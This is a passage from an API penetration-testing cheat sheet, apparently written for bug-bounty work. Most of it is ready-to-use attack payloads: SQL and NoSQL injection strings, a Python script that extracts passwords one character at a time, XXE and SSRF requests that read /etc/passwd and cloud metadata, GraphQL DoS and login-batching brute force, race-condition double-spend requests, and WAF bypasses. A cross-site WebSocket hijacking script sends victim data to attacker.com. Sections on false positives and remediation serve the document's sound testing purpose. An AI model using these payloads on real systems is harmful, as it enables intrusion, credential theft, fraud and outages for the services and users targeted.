- OAuth2 Resource Owner Password flow (client handles credentials)
- State-changing endpoint (POST/PUT/PATCH/DELETE) with security: []
- Sensitive data in path parameters (SSN, card, password, token, key)
- File upload endpoints (multipart/form-data)
- Admin/internal endpoints in public spec (tagged admin, internal, management, debug)

---

## INJECTION ATTACKS

### SQL Injection in APIs
Common entry points: search parameters, filter fields, sort fields, ID parameters, `Content-Type: application/xml` bodies.

**Classic payloads**
```
' OR '1'='1
' OR 1=1--
'; DROP TABLE users; --
' UNION SELECT username,password FROM users--
1 AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--
```

**SQLi through trusted third-party API response**
```python
# VULNERABLE: Third-party API response used in DB query without validation
db.execute(f"INSERT INTO cache (city, temp) VALUES ('{data['city']}', {data['temperature']})")
# If compromised third-party returns: {"city": "'; DROP TABLE users; --", "temperature": 72}
```

### NoSQL Injection (MongoDB)

**Authentication Bypass**
```json
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$in": ["", "password", "admin"]}}
{"$or": [{"username": "admin", "password": {"$ne": ""}}, {"username": "root", "password": {"$ne": ""}}]}
```

**$regex Exfiltration (char-by-char, like blind SQLi)**
```python
import requests, re, string

def extract_password(url, username):
    password = ""
    charset = string.ascii_letters + string.digits + string.punctuation
    while True:
        found = False
        for char in charset:
            payload = {"username": username,
                       "password": {"$regex": f"^{re.escape(password)}{re.escape(char)}"}}
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                password += char
                found = True
                break
        if not found:
            break
    return password
```

**$where JavaScript Injection**
```json
{"username": "admin", "$where": "sleep(5000)"}
{"$where": "this.password.charAt(0) == 'p'"}
{"$where": "function() { while(true) {} }"}
```

MongoDB $where operators:

| Operator | Injection Use |
|----------|---------------|
| `$ne` | Match anything that is not empty |
| `$gt` | Match any non-empty string |
| `$in` | Match any of supplied values |
| `$regex` | Char-by-char exfiltration |
| `$where` | Server-side JavaScript execution |
| `$exists` | Probe schema fields |

### Server-Side Parameter Pollution (SSPP)
```
# Inject extra backend params via encoded & and =
query=test%26apikey%3Doverride%26role%3Dadmin

# Fragment truncation (strips trailing backend param like apikey)
query=test%23

# JSON body parameter injection
{"name":"John","role":"admin","isVerified":true,"updatedBy":"attacker-controlled"}

# Path traversal to internal endpoint
..%2F..%2Fadmin%2Fsecrets

# CRLF header injection
en\r\nX-Internal-Auth: attacker-override

# SSPP delimiter fuzz set
%26injected%3Dtrue   (&)
%23                  (#)
%3Fparam2%3Dvalue2   (?)
%3Doverride          (=)
%0d%0aInjected-Header:%20true  (CRLF)
```

### HTTP Parameter Pollution (HPP)
```
# Framework precedence testing (first/last/array/comma-join)
role=user&role=admin
cmd=ls&cmd=;cat+/etc/passwd         # WAF bypass: inject in second param
q=normal&q='+OR+1=1--              # ASP.NET comma-join SQLi
item_id=123&price=99.99&price=0.01  # Price override
email=victim@target.com&email=attacker@evil.com  # Password reset hijack
POST /api/users?role=user body: {"role":"admin"}  # Query vs body split
```

### JSON Interoperability Vulnerabilities
```json
{"role":"user","name":"Alice","role":"admin"}
# First-wins validator vs last-wins backend → role=admin

{"action":"read_public_data","action":"delete_all_users"}
# WAF inspects first action; backend executes last

{"type":"user","name":"attacker","roles":["_admin"],"roles":[]}
# CVE-2017-12635: CouchDB admin escalation (first-wins vs last-wins on roles)

{"user\u0000admin":"value"}
# Null-byte key truncation across parsers

{"id": 10000000000000001}
# IEEE-754 ID truncation — JS parses large integers to ...000 (IDOR via precision loss)

{"user_id": 999999999999999999999999999999}
# Large-integer precision confusion

{"amount": 1e2}
# Scientific notation type confusion

{"value": -0}
# Negative-zero handling differences
```

### XXE via API
```bash
# Test XML content type on JSON endpoint
curl -X POST "https://api.target.com/api/v1/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>'

# SSRF via XXE
curl -X POST "https://api.target.com/api/v1/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><user><name>&xxe;</name></user>'
```

### Insecure Deserialization
```
# Java serialized object: magic bytes AC ED 00 05 (hex)
# Content-Type: application/x-java-serialized-object
# PHP: a:2:{s:4:"name";s:5:"admin";}
# Python pickle: arbitrary code execution via crafted pickle stream
data = pickle.loads(response.content)  # from third-party API — RCE
```

---

## GRAPHQL-SPECIFIC ATTACKS

### Full Introspection Query
```graphql
{
  __schema {
    types {
      name kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
    mutationType {
      fields { name args { name type { name } } }
    }
  }
}
```

**What introspection reveals:**
- All queries and mutations including admin operations
- All types and sensitive data fields
- All arguments including hidden/undocumented parameters
- Relationships enabling authorization bypass through alternate paths
- Deprecated fields (may still function, lack current security controls)

### Introspection Bypass Techniques
```graphql
# Try __type instead of __schema
{ __type(name: "User") { fields { name type { name } } } }

# Via alias
{ a: __schema { types { name } } }

# Via fragment
fragment Introspect on __Schema { types { name } }
{ __schema { ...Introspect } }

# GET request (if POST introspection is blocked)
GET /graphql?query={__schema{types{name}}}
```

### Query Complexity / DoS Attacks
```graphql
# Circular reference exponential queries (50 friends × 7 levels = 50^7 ≈ 781 billion DB lookups)
{ user(id: 1) { friends { friends { friends { friends { friends { friends { friends { name email } } } } } } } } }

# Alias-based DoS (bypasses per-query rate limits — one request, 10,000 operations)
{
  a1: user(id: 1) { name email }
  a2: user(id: 2) { name email }
  # ... through a10000: user(id: 10000) { name email }
}

# Circular fragment reference (infinite recursion in some implementations)
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
{ user(id: 1) { ...A } }
```

### GraphQL Batching Attack (rate limit bypass)
```json
POST /graphql HTTP/1.1
Content-Type: application/json

[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"}
]
// 1000 login attempts in one HTTP request — bypasses IP-based and per-request rate limits
```

### Field-Level Authorization Bypass
```graphql
# Direct access blocked
{ user(id: 42) { ssn } }  # Returns null/error — authorization check applied

# Access through relationship (authorization may not apply via relationship path)
{ order(id: 100) { customer { ssn } } }
```

### GraphQL Injection
```graphql
# SQL injection via filter argument
{ users(filter: "name = \"admin\" OR 1=1") { id email } }

# SSRF via URL field in mutation
{ generateReport(url: "http://169.254.169.254/latest/meta-data/") { content } }
```

---

## RACE CONDITIONS

### Single-Packet Attack (Kettle 2023, Black Hat USA)
**HTTP/2:** Buffer multiple request streams, send all HEADERS/DATA frames in one TCP write. Server processes all requests near-simultaneously from receive buffer — before any individual request completes.

**HTTP/1.1 fallback:** Open N connections, each missing final byte; send all final bytes simultaneously.

### TOCTOU — Financial Double-Spend
```
# Account has $1000; send 10 concurrent transfer requests for $1000 each
# All 10 read balance=$1000 → all pass check → all execute UPDATE
# Final balance: -$9000
10 × POST /api/transfer {"amount": 1000, "recipient": "attacker"}  [single-packet]
```

### Coupon/Gift Card Reuse
```
# 10 concurrent requests to redeem same $100 gift card
# All read redeemed=FALSE before any write redeemed=TRUE → $1000 from one $100 card
10 × POST /api/redeem {"code": "GIFT100"}  [single-packet]

# Single-use coupon applied to multiple orders
3 × POST /api/apply-coupon {"code": "SAVE50", "order_id": "order_1/2/3"}  [concurrent]
```

### Rate Limit Bypass via Race
```
# 100 concurrent requests arrive; all read current_count=0 before any increment
# Rate limit counter reads 0 for all 100 requests
100 × POST /api/endpoint (simultaneously via HTTP/2 single-packet)
```

### Parallel Account Creation
```
# Concurrent registration with same email → duplicate accounts
# Leads to: auth confusion, privilege differences, account takeover via password reset
100 × POST /api/register {"email": "same@email.com", "name": "attacker"}
```

### Distributed Race (Eventual Consistency)
```
# Window can be seconds/minutes in eventually-consistent systems
1. User changes password via Service A (writes to primary)
2. Attacker authenticates with old password via Service B (reads from stale replica)
3. Service B validates old password successfully
```

---

## WEBSOCKET ATTACKS

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- If WebSocket auth relies only on cookies (no CSRF token/origin check), CSWSH works -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() { ws.send(JSON.stringify({"action": "getMessages"})); };
ws.onmessage = function(event) {
    fetch('https://attacker.com/collect', {method:'POST', body: event.data});
};
</script>
```

### WebSocket Authorization Bypass
```javascript
// Establish connection with low-privilege user, then send admin messages
// Authorization may only be checked at handshake, not per-message
ws.send(JSON.stringify({"action": "getAdminData", "userId": "victim-id"}));
ws.send(JSON.stringify({"type": "subscribe", "channel": "admin-feed"}));

// Inject admin IDs after connection established
ws.send(JSON.stringify({"user_id": "admin-id", "action": "resetPassword"}));
```

### WebSocket Input Validation
```
# SQL injection via WebSocket message
{"query": "' OR '1'='1"}

# NoSQL injection
{"username": {"$ne": ""}}

# SSRF via URL in message
{"url": "http://169.254.169.254/latest/meta-data/"}

# Flood / resource exhaustion
for(var i=0; i<1000000; i++) ws.send('{"ping":"'+('A'.repeat(10000))+'"}');
```

---

## gRPC ATTACKS

### Discovery and Enumeration
```bash
# List services via reflection
grpcurl -plaintext target.com:50051 list
grpcurl target.com:443 list

# List methods for a service
grpcurl target.com:443 list userservice.UserService

# Describe a type
grpcurl target.com:443 describe userservice.UserService

# Check TLS/ALPN (gRPC requires HTTP/2)
openssl s_client -connect target.com:443 -alpn h2

# mTLS test
grpcurl -cert client.crt -key client.key -cacert ca.crt target.com:443 list
```

### Authentication Testing
```bash
# Bearer token
grpcurl -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/GetUser

# Metadata injection — trust internal headers without verification
grpcurl -H "x-forwarded-for: 127.0.0.1" \
  -H "x-original-user: admin" \
  -H "x-internal-request: true" \
  -H "x-user-id: admin-user-id" \
  -H "x-user-role: admin" \
  target.com:443 userservice.UserService/ListUsers

# Metadata size DoS
grpcurl -H "x-large-header: $(python3 -c 'print(\"A\"*1000000)')" \
  target.com:443 userservice.UserService/GetUser
```

### IDOR and Injection via gRPC
```bash
# IDOR in unary RPC
grpcurl -d '{"user_id": "other-user-id"}' \
  -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/GetUser

# SQL/filter injection
grpcurl -d '{"filter": "name = \"admin\" OR 1=1"}' \
  -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/ListUsers

# Pagination abuse
grpcurl -d '{"page_size": 999999}' \
  -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/ListUsers

# Server streaming resource exhaustion
for i in $(seq 1 100); do
  grpcurl -d '{"filter": ""}' -H "Authorization: Bearer $TOKEN" \
    target.com:443 userservice.UserService/ListUsers &
done

# CORS on gRPC-Web
curl -X OPTIONS https://target.com/grpc-web/UserService/GetUser \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: x-grpc-web,content-type" -v
```

---

## PROTOCOL-SPECIFIC ATTACKS

### REST — Versioning & Method Override
```bash
# Method override via headers
POST /api/v1/users/1002 HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
_method=DELETE  # form parameter (some frameworks)

# Version downgrade — v1 may lack auth that v2 added
GET /api/v1/admin/users HTTP/1.1  # Compare behavior with GET /api/v2/admin/users
```

### SOAP/XML-RPC
```xml
<!-- XXE in SOAP body -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getUser><name>&xxe;</name></getUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### JSON-RPC
```json
{"jsonrpc": "2.0", "method": "getUser", "params": {"id": 1002}, "id": 1}

// Batch abuse
[
  {"jsonrpc": "2.0", "method": "getUser", "params": {"id": 1}, "id": 1},
  {"jsonrpc": "2.0", "method": "getUser", "params": {"id": 2}, "id": 2}
]
```

### Webhook Security
```bash
# Test signature validation bypass
# No signature: does webhook fire without HMAC header?
# Signature replay: reuse a valid signature on modified body
# Algorithm confusion: change HMAC algorithm in header

# SSRF via webhook delivery
POST /api/v1/webhooks
{"url": "http://169.254.169.254/latest/meta-data/", "events": ["*"]}
```

### Unsafe Consumption of Third-Party APIs
```python
# VULNERABLE: Third-party API response used in DB query without validation
response = requests.get("https://partner-api.com/data").json()
db.execute(f"INSERT INTO cache (name) VALUES ('{response['name']}')")
# If partner API is compromised: response['name'] = "'; DROP TABLE users; --"

# VULNERABLE: Following redirects without validation
response = requests.get(partner_url, allow_redirects=True)
# Partner redirects to http://169.254.169.254/latest/meta-data/ → SSRF

# VULNERABLE: Fetching partner-controlled URLs
for item in partner_data['items']:
    image_response = requests.get(item['image_url'])
    # item['image_url'] could be "http://169.254.169.254/..."

# VULNERABLE: Unsafe deserialization of partner data
data = pickle.loads(response.content)  # Arbitrary code execution
```

---

## WAF BYPASS TECHNIQUES

### SQL Injection Bypasses
```
# Case variation
sElEcT * fRoM users

# Comment insertion
SE/**/LECT * FR/**/OM users
SE%00LECT * FROM users

# URL encoding
%27 OR %271%27%3D%271

# Double encoding
%2527 OR 1=1

# Whitespace alternatives
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  # Tab
SELECT%0ausername%0aFROM%0ausers  # Newline
```

### HPP WAF Bypass
```
# Hide injection in second duplicate parameter (WAF inspects first only)
cmd=ls&cmd=;cat+/etc/passwd
```

### SSRF WAF Bypass
```
http://2852039166/          # Decimal
http://0251.0376.0251.0376/ # Octal
http://0xa9.0xfe.0xa9.0xfe/ # Hex
http://[::ffff:a9fe:a9fe]/  # IPv6
http://anything@169.254.169.254/
```

---

## FALSE POSITIVE ELIMINATION

### Never Report These Alone (require chaining into real impact)
- GraphQL introspection enabled by itself
- Missing security headers (X-Frame-Options on JSON API)
- Version/banner disclosure with no working exploit
- Verbose errors with no sensitive data
- CORS wildcard with no credentialed-exfil PoC
- Rate-limit absence on non-critical endpoints
- Self-only data access (you can read only your own data)
- TLS cipher concerns without downgrade PoC
- Autocomplete-on-password
- Clickjacking on non-sensitive pages

### BOLA False Positive Checklist
```
[ ] Is the data returned sensitive (not intentionally public)?
[ ] Does unauthenticated access return the same data? (profile might be public)
[ ] Is this test/staging with relaxed config?
[ ] Does the application's privacy model treat these as public resources?
[ ] Can you access private fields (email, SSN, payment) or only public ones?
```

### SSRF False Positive Checklist
```
[ ] Was the SSRF webhook actually triggered (not just created)?
[ ] Is there network-level protection (IMDSv2, security groups, VPC rules)?
[ ] Did you get a response from the internal target?
[ ] Can you exfiltrate actual credentials/data?
[ ] Blind SSRF: did you receive an OOB DNS/HTTP callback?
```

### SQLi False Positive Checklist
```
[ ] Is the 400 response a validation error (catching payload) or a SQL error?
[ ] Did a time-based payload actually cause delay or is it normal latency?
[ ] Does the UNION SELECT return additional rows?
[ ] Is a WAF blocking the payload (try different encoding)?
```

### Evidence Standards (ALL required before reporting)
1. Reproduced from scratch in a fresh session
2. Impact is real — show actual data returned, not just 200 OK
3. Working request/response pair captured (Burp history, curl output)
4. For BOLA: show other user's actual private data
5. For SSRF: show internal response content or IAM creds
6. For JWT: show forged token accepted with elevated privileges
7. For race conditions: show state change happened multiple times (use second account to verify)
8. False positive checks completed

### False Positive Rate Benchmarks
| FP Rate | Quality | Dev Trust | Remediation |
|---------|---------|-----------|-------------|
| < 5% | Excellent | High | High |
| 5-15% | Good | Moderate | Moderate |
| 15-30% | Acceptable | Low | Low |
| > 50% | Unacceptable | None | Negative |

Automated scans alone: 40-60% FP rate. Manual verification required.

---

## TESTING METHODOLOGY

### Pre-Engagement
- Read full scope: every host, API, endpoint, version, subdomain, environment
- Confirm permitted API versions, subdomains, environments (prod vs staging)
- Note excluded endpoints, rate-limit rules, required test markers/headers
- Obtain two accounts: attacker (User A) + victim (User B, different org/group)

### Authorization Matrix
For each endpoint: list HTTP methods × roles × expected behavior. Test every cell systematically.

### Attack Surface Priority Order
1. Auth/token endpoints (login, token, password-reset, MFA, refresh, register)
2. State-changing endpoints (POST/PUT/PATCH/DELETE) — CSRF, authz, injection, race
3. File upload/download endpoints — path traversal, type bypass, SSRF, IDOR
4. Webhook/callback endpoints — SSRF, replay, signature validation
5. Admin/management endpoints — privilege escalation, missing auth
6. GraphQL — introspection, complexity, field-level authz

### STRIDE Threat Model for APIs
```
S (Spoofing):       Auth bypass, JWT forgery, session hijacking, OAuth manipulation
T (Tampering):      Parameter tampering, injection, mass assignment, IDOR write
R (Repudiation):    Missing audit logs, log injection, missing correlation IDs
I (Information):    Excessive data exposure, verbose errors, debug endpoints
D (DoS):           Missing rate limits, GraphQL complexity, ReDoS, large payloads
E (Elevation):      BOLA, BFLA, mass assignment → role elevation, JWT claim manipulation
```

### Reporting Standards
- **Title**: `[Vuln Class] in [API endpoint] allows [actor] to [impact]`
- **No theoretical language**: "An attacker CAN [action] by [method]", not "could potentially"
- **Always include PoC**: show actual other user's data / internal response / forged token
- **Two accounts for auth bugs**: show cross-account access explicitly
- **CVSS must match actual impact**
- **Separate bugs = separate reports**; combine only when ONE proven chain

---

## FRAMEWORK-SPECIFIC CVE HIGHLIGHTS

| Framework | CVE | Description | Affected Versions |
|-----------|-----|-------------|-------------------|
| PyJWT | CVE-2022-29217 | Algorithm confusion — alg not validated without explicit list | < 2.4.0 |
| jsonwebtoken (Node) | CVE-2016-10555 | Algorithm confusion RS256→HS256 | < 7.4.3 |
| Java (SunEC) | CVE-2022-21449 | ECDSA psychic signatures r=0,s=0 accepted | Java 15-18 (before 17.0.3/18.0.1) |
| jwt-go (Go) | CVE-2015-9235 | alg:none accepted | < 2.0.0 |
| CouchDB | CVE-2017-12635 | JSON duplicate key admin escalation | < 2.1.1 |
| Spring Boot Actuator | — | heapdump/env/mappings exposed without auth | Misconfigured deployments |
| GraphQL (various) | — | Introspection + complexity DoS | No complexity limits configured |

---

## TOOLS REFERENCE

| Tool | Purpose | Key Command |
|------|---------|-------------|
| **Burp Suite Pro** | Proxy, scanner, Intruder | Proxy + BApp: Param Miner, GAP, JWT Editor |
| **OWASP ZAP** | Proxy + OpenAPI plugin | Active scan with OpenAPI spec loaded |
| **ffuf** | Endpoint brute-force | `ffuf -u https://api.target.com/FUZZ -w wordlist.txt -mc 200,201,401,403,405` |
| **feroxbuster** | Recursive brute-force | `feroxbuster -u https://api.target.com -w wordlist.txt --depth 3 --rate-limit 50` |
| **gobuster** | Dir/VHOST brute-force | `gobuster dir -u https://api.target.com -w wordlist.txt -s "200,201,401,403,405"` |
| **Arjun** | Hidden parameter discovery | `arjun -u https://api.target.com/api/v1/users -m POST` |
| **x8** | JSON/header param discovery | `x8 -u "https://api.target.com/users" -w params.txt --json` |
| **subfinder** | Subdomain enumeration | `subfinder -d target.com -all -o subdomains.txt` |
| **amass** | ASN + subdomain enum | `amass enum -passive -d target.com` |
| **dnsx** | DNS resolution | `cat subdomains.txt \| dnsx -a -resp -o resolved.txt` |
| **httpx** | HTTP probing | `cat subdomains.txt \| httpx -ports 80,443,8080,8443 -tech-detect` |
| **LinkFinder** | JS endpoint extraction | `python3 linkfinder.py -i https://target.com -o cli` |
| **sourcemapper** | Source map extraction | `sourcemapper -url https://target.com/main.js.map -output ./src` |
| **jwt_tool** | JWT testing | `python3 jwt_tool.py <token> -C -d wordlist.txt` |
| **hashcat** | JWT secret cracking | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **grpcurl** | gRPC testing | `grpcurl -plaintext target.com:50051 list` |
| **Nuclei** | Template-based scanning | `nuclei -u https://api.target.com -t api-security/` |
| **truffleHog** | Secret scanning | `trufflehog github --org target --only-verified` |
| **gitleaks** | Git secret detection | `gitleaks detect --source /path/to/repo --report-format json` |
| **oasdiff** | OpenAPI spec diffing | `oasdiff diff spec_v1.json spec_v2.json --format json` |
| **Schemathesis** | Schema-based fuzzing | `schemathesis run https://api.target.com/openapi.json --checks all` |

---

## CONTINUOUS MONITORING

### OpenAPI Spec Change Detection
```bash
go install github.com/tufin/oasdiff@latest
oasdiff diff spec_v1.json spec_v2.json
oasdiff breaking spec_v1.json spec_v2.json
oasdiff changelog spec_v1.json spec_v2.json --format json > api_changes.json
```

**Security-relevant changes to alert on:**
- New endpoints added (new attack surface)
- Authentication removed from existing endpoints
- Security scheme changes
- New admin/internal endpoints in public spec

---

## REMEDIATION QUICK REFERENCE

| Vulnerability | Primary Fix |
|---------------|-------------|
| BOLA/IDOR | Server-side authorization check on EVERY endpoint × method: `if resource.owner != current_user: abort(403)` |
| Mass Assignment | Explicit allowlist of writable fields (Strong Parameters, DTO pattern, Joi schema) |
| JWT alg:none | `algorithms=["RS256"]` explicit allowlist in jwt.decode(); never accept from token header |
| JWT algorithm confusion | Separate key objects for HMAC vs RSA; require explicit algorithm in verify call |
| JWT kid injection | Validate kid against allowlist; parameterized query for DB lookup; no path construction |
| SSRF | Resolve DNS once, validate IP (private/loopback/link-local blocked), use IP for request; AWS IMDSv2 |
| NoSQL injection | Cast inputs to expected types; Pydantic/Joi schema validation; disable `$where` in MongoDB |
| Race conditions | Database-level atomic operations (`SELECT ... FOR UPDATE`); Redis SETNX for single-use codes |
| GraphQL complexity | Query complexity limits (max ~100); depth limits (max 7); disable batching or limit batch size |
| Mass resource consumption | Per-IP + per-user rate limits with exponential backoff; pagination size limits |
| BFLA | Role-based access control checked for every function, not just at the route level |
| Unsafe API consumption | Validate all third-party data with schema; parameterized queries; disable redirect following |


---

## [API Fuzzing & Bug Bounty (zebbern)] Additional Techniques

# API Fuzzing for Bug Bounty

## Purpose

Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors.

## Inputs/Prerequisites

- Burp Suite or similar proxy tool
- API wordlists (SecLists, api_wordlist)
- Understanding of REST/GraphQL/SOAP protocols
- Python for scripting
- Target API endpoints and documentation (if available)

## Outputs/Deliverables

- Identified API vulnerabilities
- IDOR exploitation proofs
- Authentication bypass techniques
- SQL injection points
- Unauthorized data access documentation

---

## API Types Overview

| Type | Protocol | Data Format | Structure |
|------|----------|-------------|-----------|
| SOAP | HTTP | XML | Header + Body |
| REST | HTTP | JSON/XML/URL | Defined endpoints |
| GraphQL | HTTP | Custom Query | Single endpoint |

---

## Core Workflow

### Step 1: API Reconnaissance

Identify API type and enumerate endpoints:

```bash
# Check for Swagger/OpenAPI documentation
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# Use Kiterunner for API discovery
kr scan https://target.com -w routes-large.kite

# Extract paths from Swagger
python3 json2paths.py swagger.json
```

### Step 2: Authentication Testing

```bash
# Test different login paths
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# Check rate limiting on auth endpoints
# If no rate limit â†’ brute force possible

# Test mobile vs web API separately
# Don't assume same security controls
```

### Step 3: IDOR Testing

Insecure Direct Object Reference is the most common API vulnerability:

```bash
# Basic IDOR
GET /api/users/1234 â†’ GET /api/users/1235

# Even if ID is email-based, try numeric
/?user_id=111 instead of /?user_id=user@mail.com

# Test /me/orders vs /user/654321/orders
```

**IDOR Bypass Techniques:**

```bash
# Wrap ID in array
{"id":111} â†’ {"id":[111]}

# JSON wrap
{"id":111} â†’ {"id":{"id":111}}

# Send ID twice
URL?id=<LEGIT>&id=<VICTIM>

# Wildcard injection
{"user_id":"*"}

# Parameter pollution
/api/get_profile?user_id=<victim>&user_id=<legit>
{"user_id":<legit_id>,"user_id":<victim_id>}
```

### Step 4: Injection Testing

**SQL Injection in JSON:**

```json
{"id":"56456"}                    â†’ OK
{"id":"56456 AND 1=1#"}           â†’ OK  
{"id":"56456 AND 1=2#"}           â†’ OK
{"id":"56456 AND 1=3#"}           â†’ ERROR (vulnerable!)
{"id":"56456 AND sleep(15)#"}     â†’ SLEEP 15 SEC
```

**Command Injection:**

```bash
# Ruby on Rails
?url=Kernel#open â†’ ?url=|ls

# Linux command injection
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE Injection:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**SSRF via API:**

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

**.NET Path.Combine Vulnerability:**

```bash
# If .NET app uses Path.Combine(path_1, path_2)
# Test for path traversal
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```

### Step 5: Method Testing

```bash
# Test all HTTP methods
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# Switch content type
Content-Type: application/json â†’ application/xml
```

---

## GraphQL-Specific Testing

### Introspection Query

Fetch entire backend schema:

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
```

**URL-encoded version:**

```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### GraphQL IDOR

```graphql
# Try accessing other user IDs
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```

### GraphQL SQL/NoSQL Injection

```graphql
mutation {
  login(input: {
    email: "test' or 1=1--"
    password: "password"
  }) {
    success
    jwt
  }
}
```

### Rate Limit Bypass (Batching)

```graphql
mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
```

### GraphQL DoS (Nested Queries)

```graphql
query {
  posts {
    comments {
      user {
        posts {
          comments {
            user {
              posts { ... }
            }
          }
        }
      }
    }
  }
}
```

### GraphQL XSS

```bash
# XSS via GraphQL endpoint
http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}

# URL-encoded XSS
http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
```

### GraphQL Tools

| Tool | Purpose |
|------|---------|
| GraphCrawler | Schema discovery |
| graphw00f | Fingerprinting |
| clairvoyance | Schema reconstruction |
| InQL | Burp extension |
| GraphQLmap | Exploitation |

---

## Endpoint Bypass Techniques

When receiving 403/401, try these bypasses:

```bash
# Original blocked request
/api/v1/users/sensitivedata â†’ 403

# Bypass attempts
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

---

## Output Exploitation

### PDF Export Attacks

```html
<!-- LFI via PDF export -->
<iframe src="file:///etc/passwd" height=1000 width=800>

<!-- SSRF via PDF export -->
<object data="http://127.0.0.1:8443"/>

<!-- Port scanning -->
<img src="http://127.0.0.1:445"/>

<!-- IP disclosure -->
<img src="https://iplogger.com/yourcode.gif"/>
```

### DoS via Limits

```bash
# Normal request
/api/news?limit=100

# DoS attempt
/api/news?limit=9999999999
```

---

## Common API Vulnerabilities Checklist

| Vulnerability | Description |
|---------------|-------------|
| API Exposure | Unprotected endpoints exposed publicly |
| Misconfigured Caching | Sensitive data cached incorrectly |
| Exposed Tokens | API keys/tokens in responses or URLs |
| JWT Weaknesses | Weak signing, no expiration, algorithm confusion |
| IDOR / BOLA | Broken Object Level Authorization |
| Undocumented Endpoints | Hidden admin/debug endpoints |
| Different Versions | Security gaps in older API versions |
| Rate Limiting | Missing or bypassable rate limits |
| Race Conditions | TOCTOU vulnerabilities |
| XXE Injection | XML parser exploitation |
| Content Type Issues | Switching between JSON/XML |
| HTTP Method Tampering | GETâ†’DELETE/PUT abuse |

---

## Quick Reference

| Vulnerability | Test Payload | Risk |
|---------------|--------------|------|
| IDOR | Change user_id parameter | High |
| SQLi | `' OR 1=1--` in JSON | Critical |
| Command Injection | `; ls /` | Critical |
| XXE | DOCTYPE with ENTITY | High |
| SSRF | Internal IP in params | High |
| Rate Limit Bypass | Batch requests | Medium |
| Method Tampering | GETâ†’DELETE | High |

---

## Tools Reference

| Category | Tool | URL |
|----------|------|-----|
| API Fuzzing | Fuzzapi | github.com/Fuzzapi/fuzzapi |
| API Fuzzing | API-fuzzer | github.com/Fuzzapi/API-fuzzer |
| API Fuzzing | Astra | github.com/flipkart-incubator/Astra |
| API Security | apicheck | github.com/BBVA/apicheck |
| API Discovery | Kiterunner | github.com/assetnote/kiterunner |
| API Discovery | openapi_security_scanner | github.com/ngalongc/openapi_security_scanner |
| API Toolkit | APIKit | github.com/API-Security/APIKit |
| API Keys | API Guesser | api-guesser.netlify.app |
| GUID | GUID Guesser | gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18 |
| GraphQL | InQL | github.com/doyensec/inql |
| GraphQL | GraphCrawler | github.com/gsmith257-cyber/GraphCrawler |
| GraphQL | graphw00f | github.com/dolevf/graphw00f |
| GraphQL | clairvoyance | github.com/nikitastupin/clairvoyance |
| GraphQL | batchql | github.com/assetnote/batchql |
| GraphQL | graphql-cop | github.com/dolevf/graphql-cop |
| Wordlists | SecLists | github.com/danielmiessler/SecLists |
| Swagger Parser | Swagger-EZ | rhinosecuritylabs.github.io/Swagger-EZ |
| Swagger Routes | swagroutes | github.com/amalmurali47/swagroutes |
| API Mindmap | MindAPI | dsopas.github.io/MindAPI/play |
| JSON Paths | json2paths | github.com/s0md3v/dump/tree/master/json2paths |

---

## Constraints

**Must:**
- Test mobile, web, and developer APIs separately
